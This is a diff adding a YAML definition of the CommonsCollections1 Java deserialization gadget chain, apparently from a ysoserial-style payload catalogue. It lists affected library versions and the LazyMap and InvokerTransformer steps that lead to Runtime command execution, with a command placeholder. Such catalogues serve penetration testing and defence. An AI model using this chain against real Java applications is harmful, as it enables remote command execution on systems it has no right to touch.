@@ -1,0 +1,28 @@
+name: "CommonsCollections1"
+category: "commons_collections"
+description: "CommonsCollections1 gadget chain using LazyMap and InvokerTransformer"
+jdk_version: "all"
+dependencies:
+  - name: "commons-collections"
+    version: "3.1-3.2.1"
+exploit_type: "command_execution"
+payload_type: "command"
+risk_level: 5
+mitre_technique: "T1566.001"
+references:
+  - "https://github.com/frohoff/ysoserial"
+  - "https://frohoff.github.io/appseccali-il-2015-marshalling-pickles/"
+steps:
+  - class_name: "org.apache.commons.collections.Transformer"
+    method_name: "transform"
+    parameters: []
+  - class_name: "org.apache.commons.collections.functors.InvokerTransformer"
+    method_name: "transform"
+    parameters:
+      - "java.lang.Runtime"
+      - "getMethod"
+      - "getRuntime"
+  - class_name: "org.apache.commons.collections.map.LazyMap"
+    method_name: "decorate"
+    parameters:
+      - "{command}"
